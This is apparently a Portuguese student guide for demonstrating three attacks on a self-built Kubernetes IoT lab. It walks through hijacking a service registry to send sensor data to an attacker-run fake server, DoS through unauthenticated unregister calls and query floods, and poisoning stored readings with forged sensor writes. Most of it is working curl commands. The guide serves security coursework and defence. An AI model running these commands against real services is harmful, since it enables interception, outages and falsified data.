# How-To: Proof-of-Concept das 3 Ameaças — SSLE Projeto 1

Guia reexecutável das PoCs. Pensado para a demo: cada secção é
autossuficiente e pode ser corrida de novo perante o avaliador.

## Pré-requisitos e variáveis

Todos os comandos correm a partir da **VM Debian hospedeira** (`lucas@ssle`).
Definir primeiro as variáveis (reexecutar sempre que abrir um terminal novo):

```bash
MASTER=10.255.255.42          # IP eth0 do k3s-master (confirmar com: incus list)
ATTACKER=10.255.255.184       # IP eth0 do contentor atacante
```

Confirmar que estão definidas antes de cada bloco:
```bash
echo "MASTER=$MASTER  ATTACKER=$ATTACKER"
```

> Nota de rede: os NodePorts (30050/30001/30003) são alcançáveis de
> qualquer contentor Incus no site. Os IPs de pod (`10.42.x.x`) só são
> alcançáveis de DENTRO de um nó do cluster (`k3s-master`/`k3s-node1`),
> não do contentor `attacker`. Isto condiciona a PoC 3 (ver lá).

---

## Setup único — contentor atacante

Só precisa de ser feito uma vez. O "fake storage" responde 200 em
`/health` (para sobreviver ao health-checker do registry) e regista o que
receber em `POST /store`.

```bash
# criar o contentor (saltar se já existir)
incus launch images:debian/trixie attacker
incus exec attacker -- bash -c 'apt-get update -qq && apt-get install -y -qq python3 curl'

# escrever o servidor fake (heredoc fora das aspas do bash -c para evitar problemas de escaping)
incus exec attacker -- bash -c "cat > /tmp/fake_storage.py" << 'PYEOF'
from http.server import BaseHTTPRequestHandler, HTTPServer
import datetime

class H(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print('[' + datetime.datetime.now().isoformat() + '] ' + (fmt % args), flush=True)
    def do_GET(self):
        self.send_response(200); self.end_headers()
        self.wfile.write(b'{"status":"ok"}')
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        print('[INTERCEPT] ' + self.path + ' <- ' + body.decode(errors='replace'), flush=True)
        self.send_response(200); self.end_headers()
        self.wfile.write(b'{"status":"intercepted"}')

HTTPServer(('0.0.0.0', 9999), H).serve_forever()
PYEOF

# lançar em background (setsid + disown para sobreviver ao fecho do incus exec)
incus exec attacker -- bash -c 'setsid nohup python3 /tmp/fake_storage.py > /tmp/fake.log 2>&1 < /dev/null & disown; sleep 1'

# confirmar
incus exec attacker -- curl -s http://localhost:9999/health    # → {"status":"ok"}
```

---

## Evidência "antes" (baseline) — correr antes das PoCs

```bash
mkdir -p ~/evidencia/antes
incus exec k3s-master -- k3s kubectl -n ssle get pods,svc,netpol -o wide | tee ~/evidencia/antes/01-topologia.txt
incus exec attacker -- curl -s "http://$MASTER:30050/services" | python3 -m json.tool | tee ~/evidencia/antes/02-registry-services.json
```

---

## PoC 1 — Route/Signals Hijacking

**Vulnerabilidades:** V1 (registo sem auth), V2 (unregister sem instance_id), I1 (NodePort).

### Fase A — registar storage falso e provar o desvio de tráfego
```bash
# registar instância falsa apontando para o atacante
incus exec attacker -- curl -s -X POST "http://$MASTER:30050/register" -H "Content-Type: application/json" -d "{\"name\":\"storage-service\",\"url\":\"http://$ATTACKER:9999\",\"instance_id\":\"xx.evil.dc-evil.rack0.nodeX.storage-service.pwned\",\"location\":{\"country\":\"xx\",\"region\":\"evil\",\"datacenter\":\"dc-evil\",\"rack\":\"rack0\",\"node\":\"nodeX\"}}"

# provar o round-robin a alternar entre real e falso
for i in 1 2 3 4 5 6; do incus exec attacker -- curl -s "http://$MASTER:30050/services/storage-service" | python3 -c "import sys,json; print(json.load(sys.stdin)['instance_id'])"; sleep 1; done | tee ~/evidencia/poc1-roundrobin-alternancia.txt

# ver dados reais do sensor a chegar ao atacante
incus exec attacker -- cat /tmp/fake.log | tee ~/evidencia/poc1-intercepted-data.log
```
**Esperado:** o loop alterna entre `...storage-f6f4dbd-lvwth` (real) e
`...pwned` (falso); o `fake.log` mostra `[INTERCEPT] /store <- {...}` com
temperaturas reais do sensor.

### Fase B — DoS via unregister em massa
```bash
# um único pedido apaga TODAS as instâncias de storage (real + falsa)
incus exec attacker -- curl -s -X DELETE "http://$MASTER:30050/unregister" -H "Content-Type: application/json" -d '{"name":"storage-service"}'

# confirmar o impacto e a autorrecuperação (heartbeat ~15s)
incus exec attacker -- curl -s "http://$MASTER:30050/services/storage-service" | tee ~/evidencia/poc1-unregister-dos.json
```
**Esperado:** `{"message":"unregistered"}`; ao fim de ~15s o storage real
volta (via heartbeat), mas o falso não (não implementa heartbeat).

---

## PoC 2 — Massive Denial-of-Service

**Vulnerabilidades:** V4 (limit=-1 / CWE-770), V6 (amplificação no registry), I5 (CPU limits).

### Vetor 1 — unbounded query (prova quantitativa)
```bash
# baseline normal
incus exec attacker -- bash -c 'time curl -s "http://'"$MASTER"':30003/anomalies?limit=100" -o /tmp/dump_normal.json'
# malicioso: limit=-1 → SQLite interpreta como ilimitado
incus exec attacker -- bash -c 'time curl -s "http://'"$MASTER"':30003/anomalies?limit=-1" -o /tmp/dump.json'
incus exec attacker -- wc -c /tmp/dump.json /tmp/dump_normal.json
```
**Esperado:** `limit=-1` ~27x mais lento (~2.8s vs ~0.1s), ~290KB vs poucos KB.

### Vetor 2 — flood amplificado (correr 2–3x para ver degradação cumulativa)
```bash
incus exec attacker -- bash -c 'seq 200 | xargs -P 20 -I{} curl -s -X POST "http://'"$MASTER"':30001/ingest" -H "Content-Type: application/json" -d "{\"device_id\":\"flood-{}\",\"temperature\":25.0}" -o /dev/null -w "%{http_code}\n"' | sort | uniq -c
```
**Esperado:** taxa de 502 variável (0%–76%) consoante o estado de
saturação prévio — a imprevisibilidade É a vulnerabilidade (sem rate limiting).

### Recuperação
```bash
sleep 30
incus exec attacker -- curl -s -w "\n%{http_code}\n" "http://$MASTER:30001/health"   # → 200
incus exec k3s-master -- k3s kubectl -n ssle get pods | tee ~/evidencia/poc2-pods-apos-recuperacao.txt   # ver RESTARTS
```

---

## PoC 3 — Botnet / Fraude de Dados

**Vulnerabilidades:** I2 (disclosure do pod IP), V5 (storage sem validação).

> IMPORTANTE: o `POST /store` tem de correr de DENTRO do cluster
> (`k3s-master`), porque o IP do pod (`10.42.x.x`) não é routável do
> contentor `attacker`. A disclosure (Path 1) corre do atacante; a
> escrita (Path 2) corre do nó.

### Fase A — disclosure do IP do pod (Attack Path 1)
```bash
STORAGE_URL=$(incus exec attacker -- curl -s "http://$MASTER:30050/services/storage-service" | python3 -c "import sys,json; print(json.load(sys.stdin)['url'])")
echo "storage pod url: $STORAGE_URL"    # → http://10.42.x.x:5002

# confirmar que NÃO é alcançável de fora do cluster (prova da barreira de rede)
curl -s --max-time 3 "$STORAGE_URL/health"; echo "exit code: $? (28 = timeout, esperado)"
```

### Fase B — escrita direta sem validação (Attack Path 2)
```bash
# valor fisicamente impossível (999°C) aceite sem validação
incus exec k3s-master -- curl -s -w "\n%{http_code}\n" -X POST "$STORAGE_URL/store" -H "Content-Type: application/json" -d "{\"device_id\":\"botnet-spoof-001\",\"temperature\":999.0}"

# simular frota de sensores forjados (botnet)
for i in $(seq 1 15); do incus exec k3s-master -- curl -s -X POST "$STORAGE_URL/store" -H "Content-Type: application/json" -d "{\"device_id\":\"bot-$i\",\"temperature\":$((RANDOM % 400 + 100)).0}"; echo; done
```

### Confirmar o envenenamento
```bash
incus exec attacker -- curl -s "http://$MASTER:30003/average" | tee ~/evidencia/poc3-average-after-botnet.json
```
**Esperado:** `average_temperature` sobe de ~25°C para ~65°C, `max` perto
de várias centenas °C.

---

## Como narrar isto na demo (sequência recomendada)

1. Mostrar o estado limpo (`/services` com 1 storage real).
2. PoC 1 Fase A — registar o fake, mostrar o `fake.log` a receber dados reais ao vivo.
3. PoC 1 Fase B — um `DELETE` apaga o serviço todo; mostrar a recuperação.
4. PoC 2 — o `limit=-1` com `time` (número do 27x é visual e imediato).
5. PoC 3 — a média a disparar após a injeção (antes/depois lado a lado).
6. Em cada uma, apontar o nó correspondente na ADTree respetiva.

## O que falta para fechar o ciclo (não é exploração, é defesa)

Estas PoCs provam EXPLORAÇÃO. Para cumprir o slide 10 ("detect and create
action-response"), falta, por ameaça:
- um sinal de deteção (Zabbix trigger ou Elastic rule) que dispare durante a PoC;
- uma ação de resposta (bloqueio, isolamento, ou alerta) demonstrável.
Sem isto, o ciclo exploração→deteção→resposta→post-mortem fica a meio.
